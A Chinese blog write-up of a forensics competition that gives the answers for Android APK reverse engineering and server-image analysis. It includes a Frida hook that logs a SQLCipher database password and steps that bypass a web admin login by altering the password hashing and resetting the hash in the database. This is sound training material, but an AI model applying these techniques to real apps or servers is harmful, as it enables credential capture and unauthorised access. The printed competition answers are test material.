title="7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>7、请分析3.verify.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><pre><code class="Plain">HL&#123;301b6b90-ac37-11ed-bad4-5811224dd424&#125;</code></pre><p>先用上一题拿到的key解aes</p><pre><code class="Python">from Crypto.Cipher import AESimport base64def decrypt_aes(key, iv, ciphertext):    cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))    plaintext = cipher.decrypt(ciphertext)    return plaintext.rstrip(b&#39;\0&#39;)def main():    # AES key，IV 和 ciphertext（密文）    key = b&#39;thisisyouraeskey&#39;    iv = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16]    ciphertext = base64.b64decode(b&#39;tPbnK29ENaqgPANeD1Hud3KyiS4uf8oaSa0b6ldRDHs=&#39;)    # 解密    decrypted_data = decrypt_aes(key, iv, ciphertext)    print(decrypted_data.decode(&#39;utf-8&#39;))if __name__ == &quot;__main__&quot;:    main()</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158767.png" alt="图片"></p><p>接下来是misc……</p><p>拆包apk后找到一个lookme文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158212.png" alt="图片"></p><p>winhex打开发现是7z文件头</p><p>改后缀输入密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032158828.png" alt="图片"></p><p>得到lookme.txt，内容为flag</p><h3 id="8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为"><a href="#8、请分析4-easyjni-zip-压缩包中数据库的解密秘钥为" class="headerlink" title="8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为"></a>8、请分析4.easyjni.zip,压缩包中数据库的解密秘钥为</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032200401.png" alt="图片"></p><p>找到密钥的获取函数<br>编写frida脚本</p><pre><code>setImmediate(function () &#123;   Java.perform(function () &#123;        var SQLiteOpenHelper = Java.use(&quot;net.sqlcipher.database.SQLiteOpenHelper&quot;);//获取类的引用        SQLiteOpenHelper.getWritableDatabase.overload(&#39;java.lang.String&#39;).implementation = function (password) &#123;//拦截getWritableDatabase方法的调用并指定参数类型           console.log(&quot;SQLiteOpenHelper.getWritableDatabase is called: password=&quot; + password);           var result = this.getWritableDatabase(password);           console.log(&quot;SQLiteOpenHelper.getWritableDatabase result=&quot; + result);           return result;        &#125;;    &#125;);&#125;);</code></pre><p>再根据判断条件构造符合要求的un和pw</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159425.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201396.png" alt="图片"></p><h3 id="9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#9、请分析4-easyjni-zip并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>9、请分析4.easyjni.zip并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032159511.png" alt="图片"></p><p>解密数据库拿到加密的账号密码：</p><p>账号密码的加密算法在 so 文件中，分析 so 文件，对字符串的每一位进行了加<br>减 以及位置交换等操作，最后进行了 Base64 换表加密。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032201251.png" alt="图片"></p><pre><code class="python">import base64base64_chars = list(&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;)a = base64_chars[3]base64_chars[3] = base64_chars[6]base64_chars[6] = aa = base64_chars[7]base64_chars[7] = base64_chars[9]base64_chars[9] = aa = base64_chars[20]base64_chars[20] = base64_chars[21]base64_chars[21] = aa = base64_chars[26]base64_chars[26] = base64_chars[1]base64_chars[1] = aa = base64_chars[30]base64_chars[30] = base64_chars[39]base64_chars[39] = aa = base64_chars[2]base64_chars[2] = base64_chars[48]base64_chars[48] = as1 = &quot;&quot;.join(i for i in base64_chars)s2 = &#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#39;data = &quot;MXpjNjRjMzVyYl4zLmACMF8CXi1hMl9jXldbieFIRG91RJFJ&quot;result = list(base64.b64decode(data.translate(str.maketrans(s1, s2)).encode(&#39;utf-8&#39;)))pLen = len(result) - 11for j in range(0, pLen-1, 2): i = result[j] result[j] = result[j+1] result[j+1] = ifor i in range(0, int(pLen/2)): j = result[i] result[i] = result[pLen-1-i] result[pLen-1-i] = jfor i in range(pLen, pLen+11): result[i] = result[i] - 15for i in range(pLen): result[i] = result[i] + 3aa = &quot;&quot;.join(chr(i) for i in result)print(aa[-11:] + aa[:-11])</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032208256.png" alt="图片"></p><h3 id="10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）"><a href="#10、请分析5-calc-apk并找到程序中的flag值（答案格式：HL-66666666-1-1-1-1-）" class="headerlink" title="10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）"></a>10、请分析5.calc.apk并找到程序中的flag值（答案格式：HL{66666666-1-1-1-1}）</h3><p>Java 层只有验证输入是否正确的逻辑，算法都在 so 文件中。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209364.png" alt="图片"></p><p>可知这里是加密函数：<br>ida 不能 F5，分析得知是没有识别 switch 结构，自定义 switch 结构即可。</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202405032209496.png" alt="图片"></p><pre><code class="c">//反编译后的函数：__int64 sub_E7EC()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; v3 = (unsigned __int8 *)sub_EA34(); for ( i = 0; ; ++i ) &#123; if ( i &gt;= 418 ) return 1; if ( (unsigned int)byte_34000[i] - 1 &lt;= 0xDuLL ) break;LABEL_20: ; &#125; switch ( (unsigned int)jpt_E874 ) &#123; case 0u: v4 ^= 0x51uLL; goto LABEL_20; case 1u: dword_341A4[v7] *= 2; goto LABEL_20; case 2u: v6 = *v3; goto LABEL_20; case 4u: v4 += (unsigned int)(v6 * dword_341A4[v7]); //形式类似方程中的 x1 * 12 + x2 * 14 + x3 * 52 ....... goto LABEL_20; case 5u: ++v7; goto LABEL_20; case 6u: ++v3; goto LABEL_20; case 7u: ++v4; goto LABEL_20; case 8u: dword_341A4[v7] += 12; goto LABEL_20; case 9u: --v4; goto LABEL_20; case 0xAu: v0 = v5++; if ( v4 == qword_342A8[v0] ) //比较值 &#123; v4 = 0LL; goto LABEL_20; &#125; return 0; case 0xBu: v3 -= 8; goto LABEL_20; case 0xCu: dword_341A4[v7] ^= 0x20u; goto LABEL_20; case 0xDu: dword_341A4[v7] -= 3; goto LABEL_20; default: goto LABEL_20; &#125;&#125;</code></pre><p>进行简单修改就可以使用 C 跑起来</p><pre><code class="C">#include &lt;stdio.h&gt;int main()&#123; __int64 v0; // x9 int i; // [xsp+1Ch] [xbp-24h] //unsigned __int8 *v3; // [xsp+20h] [xbp-20h] __int64 v4; // [xsp+28h] [xbp-18h] int v5; // [xsp+30h] [xbp-10h] int v6; // [xsp+34h] [xbp-Ch] int v7; // [xsp+38h] [xbp-8h] unsigned char byte_34000[420] = &#123; 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x01, 0x01, 0x0A, 0x06, 0x07, 0x03, 0x0E, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x0D, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x02, 0x05, 0x08, 0x0A, 0x06, 0x01, 0x01, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x09, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x01, 0x01, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0D, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x01, 0x01, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x0E, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x03, 0x05, 0x08, 0x0A, 0x06, 0x07, 0x0B, 0x0C, 0x00, 0x00 &#125;;unsigned int dword_341A4[65] = &#123; 0x00000091, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x0000002D, 0x00000094, 0x00000024, 0x00000036, 0x00000018, 0x0000002D, 0x00000036, 0x00000020, 0x00000033, 0x00000094, 0x00000038, 0x0000009A, 0x00000162, 0x00000023, 0x000000AE, 0x0000002A, 0x0000000F, 0x00000030, 0x0000004A, 0x0000009A, 0x00000036, 0x00000033, 0x0000004A, 0x0000002A, 0x00000041, 0x00000030, 0x00000038, 0x0000009A, 0x00000036, 0x00000023, 0x0000004A, 0x0000008E, 0x0000005F, 0x00000030, 0x00000038, 0x0000004A, 0x00000036, 0x00000023, 0x0000002C, 0x0000002A, 0x00000091, 0x00000044, 0x00000038, 0x0000000F, 0x00000036, 0x00000023, 0x0000004A, 0x0000002A, 0x00000091, 0x00000030, 0x00000060, 0x0000009A, 0x0000009A, 0x00000023, 0x0000004A, 0x0000002A, 0x00000000&#125;; unsigned long qword_342A8[8] = &#123; 0x000000000000E51E, 0x0000000000009DE7, 0x00000000000137F6, 0x000000000000BEBA, 0x00000000000101A2, 0x00000000000092E8, 0x0000000000009204, 0x000000000000EF22 &#125;; char *v3 = &quot;12345678&quot;; v7 = 0; v6 = 0; v5 = 0; v4 = 0LL; for ( i = 0; i &lt; 418; ++i ) &#123; switch (byte_34000[i]) &#123; case 1u:v4 ^= 0x51uLL; goto LABEL_19; case 2u: dword_341A4[v7] *= 2; goto LABEL_19; case 3u: v6 = *v3; goto LABEL_19; case 5u: v4 += (unsigned int) (v6 * dword_341A4[v7]); ////在这里将值进行输出 printf(&quot;x%c * %d + &quot;, v6, dword_341A4[v7]); goto LABEL_19; case 6u: ++v7; goto LABEL_19; case 7u: ++v3; goto LABEL_19; case 8u: ++v4; goto LABEL_19; case 9u: dword_341A4[v7] += 12; goto LABEL_19; case 0xAu: --v4; goto LABEL_19; case 0xBu: v0 = v5++; printf(&quot;= %d\n&quot;, qword_342A8[v0]); //将最终比较的数据进行输出 break; //return 0; case 0xCu: v3 -= 8; goto LABEL_19; case 0xDu: dword_341A4[v7] ^= 0x20u; goto LABEL_19; case 0xEu: dword_341A4[v7] -= 3; goto LABEL_19; default: goto LABEL_19; LABEL_19: break; &#125; &#125; &#125;&#125;//跑起来后，会输出如下形式，8 元一次方程：x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 = 58654x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7 * 54 + x8 * 32 = 40423x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 = 79862x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7 * 74 + x8 * 42 = 48826x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74+ x8 * 142 = 65954x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 +x8 * 42 = 37608x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7 * 74 + x8 * 42 = 37380x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 = 61218</code></pre><p>z3直接解</p><pre><code class="python">from z3 import *import hashlibdef hash_md5(data): hash=hashlib.md5() hash.update(bytes(data,encoding=&#39;utf-8&#39;)) return hash.hexdigest()x1 = Int(&#39;x1&#39;)x2 = Int(&#39;x2&#39;)x3 = Int(&#39;x3&#39;)x4 = Int(&#39;x4&#39;)x5 = Int(&#39;x5&#39;)x6 = Int(&#39;x6&#39;)x7 = Int(&#39;x7&#39;)x8 = Int(&#39;x8&#39;)s = Solver()s.add(x1 * 145 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 42 == 58654)s.add(x1 * 90 + x2 * 148 + x3 * 36 + x4 * 54 + x5 * 24 + x6 * 45 + x7* 54 + x8 * 32 == 40423)s.add(x1 * 51 + x2 * 145 + x3 * 56 + x4 * 186 + x5 * 354 + x6 * 35 + x7 * 174 + x8 * 42 == 79862)s.add(x1 * 47 + x2 * 48 + x3 * 74 + x4 * 154 + x5 * 54 + x6 * 51 + x7* 74 + x8 * 42 == 48826)s.add(x1 * 65 + x2 * 48 + x3 * 112 + x4 * 154 + x5 * 54 + x6 * 47 + x7 * 74 + x8 * 142 == 65954)s.add(x1 * 95 + x2 * 48 + x3 * 56 + x4 * 74 + x5 * 54 + x6 * 35 + x7 * 44 + x8 * 42 == 37608)s.add(x1 * 145 + x2 * 68 + x3 * 56 + x4 * 15 + x5 * 54 + x6 * 35 + x7* 74 + x8 * 42 == 37380)s.add(x1 * 145 + x2 * 48 + x3 * 96 + x4 * 154 + x5 * 154 + x6 * 35 + x7 * 74 + x8 * 42 == 61218)if (s.check() == sat): model = s.model() print(model) flag=&quot;&quot; for i in range(1, 9): if (model[eval(&quot;x&quot; + str(i))] != None): flag += chr(model[eval(&quot;x&quot; + str(i))].as_long().real) else: flag += &quot; &quot; print(&quot;HL&#123;&quot; + hash_md5(flag) + &quot;&#125;&quot;)</code></pre><p>app 的正确输入：AZaz09@}<br>最终答案：HL{96233a87c59bf7f0aa2ed16d9bc2e07a}</p><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><h3 id="1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）"><a href="#1-请对所给服务器检材进行分析，请-写-出-管-理-员-安-装“mdadm-4-1-9-el7-9-x86-64”的时间？（答案格式：18-18-18）" class="headerlink" title="1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）"></a><strong>1. 请对所给服务器检材进行分析，请 写 出 管 理 员 安 装“mdadm-4.1-9.el7_9.x86_64”的时间？（答案格式：18:18:18）</strong></h3><pre><code>13:13:01</code></pre><p>使用命令搜索</p><p>rpm可以提供包的名称、版本、发布信息、安装日期、大小、构建日期、构建主机、安装后的大小、来源RPM、许可证、URL、摘要和描述等信息。</p><pre><code>rpm -qi mdadm </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261517242.png" alt="image-20240426151736184"></p><p>Install Data就是安装时间 <code>01:13:01 PM CST</code> 是下午的1点13分1秒 换成24小时制就是<code>13:13:01</code></p><h3 id="2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）"><a href="#2-请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：-x2F-abc-x2F-def）" class="headerlink" title="2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）"></a><strong>2. 请对所给服务器检材进行分析，请写出宝塔默认建站的目录是什么？（答案格式：&#x2F;abc&#x2F;def）</strong></h3><pre><code>/data</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242314026.png" alt="image-20240424231441889"></p><h3 id="3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#3-请对所给服务器检材进行分析，请写出ip为192-168-157-1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>3.请对所给服务器检材进行分析，请写出ip为192.168.157.1的机器登陆失败的时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-10-09 16:47:29</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261525429.png" alt="image-20240426152509355"></p><h3 id="4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"><a href="#4-请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）" class="headerlink" title="4.请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）"></a>4.<strong>请对所给服务器检材进行分析，写出网站的数据库root帐号密码？（答案格式：xxxx）</strong></h3><pre><code>hl@7001</code></pre><p>网站数据库的root账号密码 其实首先应该看<code>config/database.php</code>文件 我们从服务器分析出来的zip格式的压缩包中可以找到一个<code>shopxo.zip</code>  解压之后看起来很像网站源码的格式 但是会发现<code>config</code>文件夹下并没有<code>database.php</code>这个文件 需要另找出路</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261532227.png" alt="image-20240426153220162"></p><p>我们发现服务器部分的附件除了给了<code>server4.E01</code> 之外还给了<code>server1 server2 server3</code>三个文件 看起来很像raid重组 直接使用火眼的raid重组工具 </p><p>先查看raid信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261535159.png" alt="image-20240426153554128"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261536595.png" alt="image-20240426153602558"></p><p>在使用raid重组成逻辑盘 条带大小根据前面的raid信息改为1024 再点击生成文件 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261537560.png" alt="image-20240426153737509"></p><p>得到重组之后的镜像 然后使用UFS Explorer导出真正的磁盘镜像 导出为1.dsk</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545162.png" alt="image-20240426154527051"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261545820.png" alt="image-20240426154554774"></p><p>使用给出的<code>server4.E01</code>和导出的<code>1.dsk</code>两个磁盘进行仿真 将<code>server4.E01</code>作为系统盘  </p><p>仿真后 查看磁盘使用情况 看到这块磁盘已经存在了 </p><pre><code>lsblk</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261550164.png" alt="image-20240426155051131"></p><p>还需要在挂载上 这块磁盘其实就是&#x2F;data分区</p><pre><code>mount /dev/sdb /data</code></pre><p>成功挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261551716.png" alt="image-20240426155148676"></p><p>此时的<code>/data/2023.cn/config/</code>文件夹下就有<code>database.php</code>了 成功查看到用户名和密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261552698.png" alt="image-20240426155257652"></p><h3 id="5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）"><a href="#5-请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx-xx-xxx-xxx-）" class="headerlink" title="5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）"></a><strong>5. 请对所给服务器检材进行分析，请分析网站后台管理员帐号的加密方式（答案格式：xx($xx.xxx($xxx)）</strong></h3><pre><code>md5($salt.trim($pwd))</code></pre><p>直接在源码里面搜<code>$pwd</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404242327139.png" alt="image-20240424232724073"></p><h3 id="6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）"><a href="#6-请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx-xx-xx-xx）" class="headerlink" title="6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）"></a>6. 请对所给服务器检材进行分析，网站首页友情链接中的”弘连网络“的更新时间是什么时候？（答案格式：xxxx-xx-xx xx:xx:xx）</h3><pre><code>2020-07-09 13:46:17</code></pre><h4 id="解决xshell和xftp连接问题"><a href="#解决xshell和xftp连接问题" class="headerlink" title="解决xshell和xftp连接问题"></a>解决xshell和xftp连接问题</h4><p>在仿真镜像后 我们会发现无法正常连接xshell和xftp  这篇文章可以解决</p><p><a href="https://blog.csdn.net/Jupite_ch/article/details/107034135">centos服务器拒绝ssh连接问题</a></p><p>查看<code>hosts.allow和hosts.deny</code>两个文件 将里面最后一行的内容直接注释就可以正常连接xshell和xftp</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261628619.png" alt="image-20240426162853579"></p><p>解决这个问题之后 我们直接连上xftp 将网站源码保存到本地 然后使用FileLocator搜索<code>弘连</code>关键字 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261643669.png" alt="image-20240426164333588"></p><h3 id="7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）"><a href="#7-请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx-php）" class="headerlink" title="7. 请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：xxx.php）"></a><strong>7.</strong> <strong>请对所给服务器检材进行分析，网站后台管理页面入口文件名是什么？（答案格式：<strong><strong>xxx.php</strong></strong>）</strong></h3><pre><code>4008003721.php</code></pre><p>查看网站操作日志 看到将<code>admin.php</code>文件重命名为了<code>4008003721.php</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261650783.png" alt="image-20240426165026735"></p><p>为了验证一下这个结果 我们需要重构网站一下 </p><p>我们在火眼的分析结果中看到存在docker容器 并且是mysql的容器 同时使用<code>netstat -lnpt</code>命令查看端口使用情况看到本地mysql端口是3306 但是<code>database.php</code>中写的mysql服务端口是3307 说明这个网站的数据库在docker容器中 而不是服务器本机中 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659342.png" alt="image-20240426165908311"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261659636.png" alt="image-20240426165937577"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261527826.png" alt="image-20240426152750756"></p><p>我们在挂载上raid重组盘之后 就解决了宝塔面板中没有网站源码的问题 下一步直接启动docker容器中的mysql服务即可</p><pre><code>docker ps -a docker start 8fbd1968d75e</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261701189.png" alt="image-20240426170118160"></p><p>然后修改我们本地hosts文件 使用火绒就行 在其中添加</p><pre><code>192.168.24.133 www.hl2023.cn</code></pre><p>赋予网站源码全部权限 </p><pre><code>chmod 777 -R 2023.cn</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261703443.png" alt="image-20240426170337405"></p><p>就可以访问网站了 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704955.png" alt="image-20240426170411630"></p><p>在访问前面找到的后台管理页面 成功访问 说明这个页面就是后台管理页面 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261704169.png" alt="image-20240426170459010"></p><h4 id="后台密码绕过"><a href="#后台密码绕过" class="headerlink" title="后台密码绕过"></a>后台密码绕过</h4><p>顺便说一下 怎么绕过后台登陆密码 前面我们也知道了后台登陆密码的加密方式是带盐值的md5加密 我们直接修改网站源码 将加密方式改为直接md5加密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261713965.png" alt="image-20240426171324931"></p><p>使用cmd5网站 得到<code>123456</code>的md5加密值</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714682.png" alt="image-20240426171428611"></p><p>在docker中进入mysql服务 修改admin的密码为123456的md5加密值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261714491.png" alt="image-20240426171456404"></p><p>访问后台管理页面 使用<code>admin/123456</code>成功登陆</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261717422.png" alt="image-20240426171726286"></p><h3 id="8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"><a href="#8-请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写" class="headerlink" title="8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写"></a>8.请对所给服务器检材进行分析，网站数据库备份文件的sha256的值是多少？（答案格式：a656ac5f9e9d3bc2915aec31a5dfd0bd3bd3ef1ac497016dafae43669d7d6d22不区分大小写</h3><pre><code>9dede75e455a7c4c5cc4b61e41570adf82af25251c5fd8456a637add864b0af0</code></pre><p>在宝塔中看到数据库存在备份文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261651058.png" alt="image-20240426165144979"></p><p>从火眼分析中找这个文件 导出计算sha256</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/202404261652274.png" 